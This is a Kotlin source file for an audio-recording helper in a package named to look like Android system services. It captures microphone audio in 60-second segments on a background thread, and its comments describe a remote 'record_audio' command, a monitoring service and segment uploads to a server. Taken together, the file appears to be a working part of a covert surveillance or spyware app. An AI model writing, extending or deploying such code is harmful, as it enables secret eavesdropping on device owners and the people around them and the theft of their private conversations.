package com.android.systemservices

import android.content.Context
import android.media.MediaRecorder
import android.util.Log
import java.io.File
import kotlin.math.min

class AudioHelper(private val context: Context) {
    private val TAG = "AudioHelper"

    @Volatile private var activeRecorder: MediaRecorder? = null
    @Volatile private var activeThread: Thread? = null

    // Used by MonitoringService to defer auto-deep-sleep while a record_audio session is in
    // progress — see the deepSleepAutoRunnable guard, which already does this for live streams.
    val isRecording: Boolean get() = activeThread != null

    companion object {
        // record_audio uploads in segments instead of one blob at the end (see
        // MonitoringService's record_audio handler + server's audio_segment ingest/finalize —
        // this is what lets a reboot/network outage mid-recording lose only the in-flight
        // segment instead of the whole clip). Raw ADTS-AAC output (not MPEG_4/.m4a) is required:
        // unlike .m4a, ADTS frames are self-delimiting, so the server can byte-concatenate
        // sequential segments into one valid playable stream without ffmpeg/remuxing.
        const val SEGMENT_SECONDS = 60
    }

    // Records `durationSeconds` total, as a loop of <=SEGMENT_SECONDS-second chunks. `onSegment`
    // fires once per chunk with (bytes, seq, isFinal) — isFinal marks the last segment (either the
    // requested duration was reached, or stopAndFlush() cut it short). `bytes` is null only when a
    // segment failed outright (e.g. a MediaRecorder init error), in which case isFinal is always
    // true too — the whole recording aborts rather than retrying into a possible failure loop.
    fun recordAudio(durationSeconds: Int = 10, onSegment: (bytes: ByteArray?, seq: Int, isFinal: Boolean) -> Unit) {
        val t = Thread {
            var seq = 0
            var remaining = durationSeconds
            var stoppedEarly = false
            while (remaining > 0) {
                val segDur = min(SEGMENT_SECONDS, remaining)
                val outFile = File(context.cacheDir, "rec_${System.currentTimeMillis()}_$seq.aac")
                var rec: MediaRecorder? = null
                try {
                    rec = MediaRecorder(context).apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setAudioSamplingRate(44_100)
                        setAudioEncodingBitRate(64_000)
                        setOutputFile(outFile.absolutePath)
                        prepare()
                        start()
                    }
                    activeRecorder = rec
                    try {
                        Thread.sleep(segDur * 1_000L)
                    } catch (_: InterruptedException) {
                        stoppedEarly = true
                        Log.i(TAG, "Recording interrupted — flushing final segment")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Recording start error (segment $seq)", e)
                    try { rec?.release() } catch (_: Exception) {}
                    activeRecorder = null
                    outFile.delete()
                    onSegment(null, seq, true)   // tell the caller the session is over
                    activeThread = null
                    return@Thread
                }

                activeRecorder = null
                // Stop recorder and write final ADTS bytes — partial file is still valid.
                try { rec?.stop() } catch (e: Exception) { Log.w(TAG, "stop: ${e.message}") }
                try { rec?.release() } catch (_: Exception) {}

                remaining -= segDur
                val isFinal = stoppedEarly || remaining <= 0
                val bytes = if (outFile.exists() && outFile.length() > 0) {
                    try { outFile.readBytes() } catch (_: Exception) { null }
                } else null
                outFile.delete()
                onSegment(bytes, seq, isFinal)
                seq++
                if (isFinal) break
            }
            activeThread = null
        }
        t.isDaemon = true
        t.name = "AudioRec"
        activeThread = t
        t.start()
    }

    // Stop early and flush whatever was recorded in the CURRENT segment so far. The loop thread
    // catches the InterruptedException, emits that (now-final, possibly short) segment, and exits
    // rather than continuing on to another segment.
    fun stopAndFlush() {
        activeThread?.interrupt()
    }
}
